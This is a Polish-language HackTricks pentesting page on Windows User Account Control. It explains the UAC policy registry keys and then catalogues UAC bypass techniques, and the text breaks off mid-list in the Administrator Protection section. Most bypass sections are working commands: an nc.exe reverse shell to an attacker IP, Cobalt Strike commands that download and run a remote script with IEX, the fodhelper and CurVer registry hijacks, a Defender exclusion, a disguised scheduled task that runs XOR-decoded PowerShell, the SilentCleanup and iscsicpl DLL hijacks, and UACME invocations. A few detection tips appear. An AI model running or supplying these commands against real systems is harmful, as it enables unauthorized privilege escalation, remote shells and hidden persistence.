# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogą potencjalnie narazić system na niebezpieczeństwo**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta niebędącego administratorem**, chyba że administrator wyraźnie zezwoli tym aplikacjom/zadaniom na dostęp do systemu na poziomie administratora. Jest to funkcja wygody, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integralności:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, użytkownik będący administratorem otrzymuje 2 tokeny: token standardowego użytkownika, służący do wykonywania zwykłych działań przy średnim poziomie integralności, oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC, w tym proces logowania, doświadczenie użytkownika i architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać zasad zabezpieczeń do konfigurowania działania UAC na poziomie lokalnym, odpowiednio do potrzeb organizacji (za pomocą secpol.msc), albo konfigurować je i wdrażać za pośrednictwem obiektów zasad grupy (GPO) w środowisku domenowym Active Directory. Poszczególne ustawienia omówiono szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 zasad grupy. Poniższa tabela zawiera dodatkowe informacje:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na bezpiecznym pulpicie)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Zasady instalowania oprogramowania w systemie Windows

**lokalne zasady zabezpieczeń** („secpol.msc” w większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać instalator oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Klucze rejestru wymuszające wyświetlanie monitu UAC o podwyższenie uprawnień

Jako standardowy użytkownik bez uprawnień administratora możesz dopilnować, aby konto „standardowe” było **proszone przez UAC o poświadczenia** podczas próby wykonania określonych działań. Wymaga to zmodyfikowania określonych **kluczy rejestru**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** lub atakujący jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te wymuszają **ponowne wprowadzenie poświadczeń konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne tylko wtedy, gdy masz już podwyższony token, UAC bypass lub błędną konfigurację umożliwiającą zmianę tych kluczy; w przeciwnym razie sam zapis do rejestru zostanie zablokowany.**

Klucze i wpisy rejestru, które należy zmienić, są następujące (w nawiasach podano ich wartości domyślne):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również wykonać ręcznie za pomocą narzędzia Local Security Policy. Po wprowadzeniu zmian operacje administracyjne wymagają od użytkownika ponownego wprowadzenia poświadczeń.

### Uwaga

**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez exploita lokalnego podniesienia uprawnień.

### Poproś użytkownika o „pełny dostęp do komputera”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Uprawnienia UAC

- Internet Explorer Protected Mode uses integrity checks to prevent high-integrity-level processes (like web browsers) from accessing low-integrity-level data (like the temporary Internet files folder). This is done by running the browser with a low-integrity token. When the browser attempts to access data stored in the low-integrity zone, the operating system checks the integrity level of the process and allows access accordingly. This feature helps prevent remote code execution attacks from gaining access to sensitive data on the system.
- Gdy użytkownik loguje się do Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę danych uwierzytelniających użytkownika, czyli danych używanych do uwierzytelniania użytkownika na komputerze i do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować Windows do automatycznego logowania określonego użytkownika podczas uruchamiania, ustaw **`AutoAdminLogon` registry key**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tej funkcji wyłącznie w bezpiecznych systemach, ponieważ ujawnia ona hasło w rejestrze.

Ustaw następujące keys za pomocą Registry Editor lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do ofiary, UAC bypass jest prosty, ponieważ możesz po prostu kliknąć „Yes”, gdy pojawi się monit UAC

UAC bypass jest potrzebny w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście medium integrity, a użytkownik należy do grupy administratorów**.

Należy wspomnieć, że **znacznie trudniej jest wykonać UAC bypass, jeśli UAC działa na najwyższym poziomie zabezpieczeń (Always), niż gdy działa na którymkolwiek z pozostałych poziomów (Default).**

### Szybki triage z medium-integrity shell

Przed próbą wykonania bypass potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj build hosta do znanych działających metod:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktyczne uwagi:
- Jeśli `EnableLUA=0`, obejście nie jest potrzebne: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / obejść opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować dokładną kompilację zamiast zakładać niepowodzenie: UACME nadal śledzi niektóre metody `AlwaysNotify compatible` na nowoczesnych kompilacjach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` ma wartość **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego jak:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC „bypass” (pełny dostęp do systemu plików)

Jeśli masz shell z użytkownikiem należącym do grupy Administrators, możesz **zamontować udział C$** udostępniony przez SMB (system plików) lokalnie jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Ominięcie UAC za pomocą Cobalt Strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** również mają kilka modułów do **bypass**owania **UAC**.

### Podniesione interfejsy COM (`ICMLuaUtil` / `CMSTPLUA`)

Automatycznie podnoszone obiekty COM pozostają praktycznym wektorem UAC we współczesnych kompilacjach. `ICMLuaUtil` jest nadal śledzony przez UACME jako działający w aktualnych gałęziach Windows, a narzędzia ofensywne nadal dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonywanie 64-bitowe i czasami maskowanie PEB/procesu przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka zawiedzie, spróbuj ponownie z implementacji BOF / UACME zamiast z naiwnego wrappera `CreateProcess`.
- Zakładaj, że wykonywanie procesu potomnego odbędzie się w **osobnym podniesionym procesie**; wiele BOF-ów nie podnosi bieżącego beacona bezpośrednio.

### KRBUACBypass

Dokumentacja i narzędzie znajdują się pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploity omijające UAC

[**UACME**](https://github.com/hfiref0x/UACME) to zbiór technik omijania UAC. Skompiluj go za pomocą Visual Studio lub MSBuild; kompilacja tworzy kilka plików wykonywalnych (na przykład `Source\Akagi\output\x64\Debug\Akagi.exe`), dlatego wybierz metodę odpowiednią dla docelowej kompilacji.<sup>[[3]](#references)</sup>\
Zachowaj ostrożność: niektóre metody bypass uruchamiają widoczne programy lub monity, które mogą zaalarmować użytkownika.<sup>[[3]](#references)</sup>

UACME zawiera **wersję kompilacji, od której każda technika zaczęła działać**.<sup>[[3]](#references)</sup> Możesz wyszukać technikę dotyczącą używanych przez Ciebie wersji:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając ze [strony](https://en.wikipedia.org/wiki/Windows_10_version_history), można określić wydanie Windows `1607` na podstawie wersji kompilacji.

Praktyczny workflow polega na tym, aby najpierw **ocenić kompilację hosta**, a dopiero potem uruchomić pasującą metodę:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pozwala szybko odrzucić niedziałające PoC.<sup>[[4]](#references)</sup>
- `UACME` pozostaje najlepszym publicznym katalogiem do powiązania bypassu z konkretnym buildem. Wersja 3.7.1 dodała metody 83–85, podczas gdy poprzednie wydanie ponownie przetestowało istniejące metody w środowisku **Windows 11 25H2**; sprawdź ponownie tabelę metod i informacje o wydaniu, zamiast zakładać, że stare PoC nadal działa bez zmian.<sup>[[3]](#references)[[9]](#references)</sup>

### Łańcuchy WNF/UIAccess zgodne z Always Notify (UACME 3.7.1)

`Always Notify` nie eliminuje każdego UAC bypass. UACME 3.7.1 implementuje trzy nowe metody x64, które łączą kontrolowany przez użytkownika stan środowiska/protokołu z zachowaniem podwyższonych scheduled tasków lub UIAccess, i oznacza wszystkie jako `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** przekieruj `SystemRoot`, aby wywołane przez WNF zadanie `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` spowodowało, że podwyższony `taskhostw.exe` wykona side-load `unifiedconsent.dll`. UACME śledzi tę metodę od builda 19041 systemu Windows 10.
- **84 — TabTip:** użyj tego samego prymitywu zmiennej środowiskowej wobec UIAccess `TabTip.exe`, który ładuje `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` lub `rsaenh.dll` zależnie od builda, a następnie przejdź z uzyskanego kontekstu UIAccess o wysokiej integralności. UACME śledzi tę metodę od Windows 8.1 / Server 2016.
- **85 — Narrator:** przejmij per-user protokół `feedback-hub`, steruj Narratorem za pomocą `Alt+CapsLock+F`, a następnie uruchom zapisywalną kopię `osk.exe`, która wykonuje side-load `OskSupport.dll`. Wymaga to interaktywnego pulpitu i jest śledzona od Windows 10 1809 / Server 2019.

Po zbudowaniu jednostek payloadu i Akagi zgodnie z dokumentacją UACME wywołaj pasujący numer metody (opcjonalne polecenie domyślnie to `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Metody 84 i 85 zależą od UIAccess/interakcji z pulpitem, dlatego nie należy oczekiwać, że będą działać bez zmian z Session 0 lub z nieinteraktywnej powłoki usługi. Wszystkie trzy modyfikują stan środowiska/protokołu i przygotowują biblioteki DLL; po zakończeniu testów sprawdź implementację i usuń te artefakty.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (przejęcie rejestru)

Zaufany plik binarny `fodhelper.exe` jest automatycznie uruchamiany z podwyższonymi uprawnieniami w nowoczesnym systemie Windows. Po uruchomieniu odczytuje poniższą ścieżkę rejestru użytkownika bez weryfikowania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie integralności Medium (użytkownik należy do grupy Administrators) uruchomić proces o poziomie integralności High bez monitu UAC.

Ścieżka rejestru odczytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw payload, a następnie uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest domyślny/łagodny (nie ustawiony na Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Aby zachować skrytość, unikaj interfejsów użytkownika wyświetlających monity.

#### Wariant hijack CurVer/extension (tylko HKCU)

Nowsze próbki wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Auto-elevated binary nadal wyszukuje handler w `HKCU`, więc do umieszczenia kluczy nie jest potrzebny token administratora:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z wysokim poziomem integralności. Typowe zadanie persistence przechowuje na dysku **zaszyfrowany algorytmem XOR skrypt PowerShell**, a następnie co godzinę dekoduje go i wykonuje w pamięci:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ten wariant nadal usuwa dropper i pozostawia tylko staged payloads, przez co wykrywanie wymaga monitorowania **`CurVer` hijack**, modyfikacji `ConsentPromptBehaviorAdmin`, tworzenia wykluczeń Defendera lub scheduled tasks, które odszyfrowują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać wysoki poziom integralności bez okna zgody.<sup>[[8]](#references)</sup> Ta metoda nadal jest warta przetestowania na nowszych buildach, ponieważ UACME utrzymuje tę technikę aktywną, a ostatnie śledzenie zgłoszeń wskazuje, że Windows 11 24H2 może wymagać jedynie niewielkich zmian w cudzysłowach.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Jeśli zadanie cytuje ścieżkę w tej wersji systemu, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po zakończeniu testów zawsze wyczyść `HKCU\Environment\windir`.

#### More UAC bypass

Wiele klasycznych UAC bypasses wykorzystujących przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarcza.

Często można rozwiązać ten problem za pomocą sesji **meterpreter**. Wykonaj migrację do **process**, którego wartość **Session** wynosi **1**:

![Skieruj ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu - More UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Wykonaj migrację do procesu, którego wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass with GUI

Jeśli masz dostęp do **GUI**, możesz po prostu zaakceptować monit UAC, gdy się pojawi; w rzeczywistości nie potrzebujesz technicznego bypassu. Dlatego uzyskanie sesji GUI często wystarcza do ominięcia praktycznych niedogodności powodowanych przez UAC.

Ponadto, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie za pośrednictwem RDP), **niektóre narzędzia będą uruchomione jako administrator**, więc możesz bezpośrednio **uruchomić** na przykład **cmd** **jako administrator**, bez ponownego wyświetlania monitu UAC, tak jak w przypadku [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Noisy brute-force UAC bypass

Jeśli hałas jest akceptowalny, narzędzie takie jak [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) może wielokrotnie żądać podniesienia uprawnień, dopóki użytkownik go nie zaakceptuje.

### Your own bypass - Basic UAC bypass methodology

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypasses wykorzystuje DLL hijacking** (często powodując, że podniesiony binarny plik ładuje kontrolowaną przez atakującego bibliotekę DLL z zapisywalnej ścieżki). [Przeczytaj ten materiał, aby dowiedzieć się, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź plik binarny, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na poziomie wysokiej integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie konieczne będzie **zapisanie** biblioteki DLL w niektórych **chronionych ścieżkach** (takich jak C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
1. **wusa.exe**: Windows 7, 8 i 8.1. Pozwala wyodrębnić zawartość pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane z poziomu wysokiej integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **script**, który skopiuje bibliotekę DLL do chronionej ścieżki i uruchomi podatny, automatycznie podnoszący uprawnienia plik binarny.

### Another UAC bypass technique

Polega na sprawdzeniu, czy **autoElevated binary** próbuje **odczytać** z **registry** **name/path** **binary** lub **command**, który ma zostać **wykonany** (jest to bardziej interesujące, jeśli plik binarny wyszukuje te informacje w **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to plik binarny z **auto-elevated**, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwą bibliotekę `iscsiexe.dll` w **folderze zapisywalnym przez użytkownika**, a następnie zmodyfikować bieżący `PATH` użytkownika (na przykład za pośrednictwem `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować bibliotekę DLL atakującego do procesu z podniesionymi uprawnieniami `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktyczne uwagi:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale działa na poziomie **Medium Integrity** z powodu UAC.
- Kopia w **SysWOW64** jest istotna dla tego bypassu. Kopię w **System32** traktuj jako osobny plik binarny i niezależnie sprawdź jego działanie.
- Prymityw jest połączeniem **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam workflow ProcMon, który jest używany w przypadku innych UAC bypasses, jest przydatny do potwierdzenia brakującego ładowania DLL.

Minimalny przebieg:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły na wykrywanie:
- Generuj alerty na `reg add` / zapisy do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.

### Nowsze badania warte osobnego sprawdzenia

Niektóre chains po 2024 roku nie wyglądają już jak klasyczne hijacki rejestru `HKCU\Software\Classes`. Przykładowo activation-context cache poisoning może połączyć **drive remap** i **DLL redirection**, aby przejść z medium do high integrity za pośrednictwem zaufanego UI / auto-elevated binaries, takich jak `ctfmon.exe`, a następnie nowszych celów, takich jak `fodhelper.exe`. Zamiast duplikować tutaj duży PoC, sprawdź krótkie przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview): drive-letter hijack przez per-logon-session DOS device map

> [!NOTE]
> Według stanu na sierpień 2026 Microsoft nadal dokumentuje Administrator Protection jako **Insider preview**: wdrożenie z października 2025 roku zostało wycofane i jest planowane na późniejszy termin. Przed testowaniem tych chains potwierdź, że **Admin Approval Mode with Administrator protection** jest rzeczywiście włączony oraz że urządzenie zostało uruchomione ponownie; sam numer wersji stock 25H2 nie dowodzi, że funkcja jest aktywna.<sup>[[10]](#references)</sup>

Pełny attack surface `RAiLaunchAdminProcess` / UIAccess w wersjach preview Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” używa shadow-admin tokens z mapami `\Sessions\0\DosDevices/<LUID>` per session. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązywaniu `\??`. Jeśli attacker podszyje się pod shadow-admin token tylko na poziomie **SecurityIdentification**, katalog zostanie utworzony z attackerem jako **owner** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie drive-letter links mających pierwszeństwo przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji o niskich uprawnieniach wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony promptu shadow-admin `runonce.exe`.
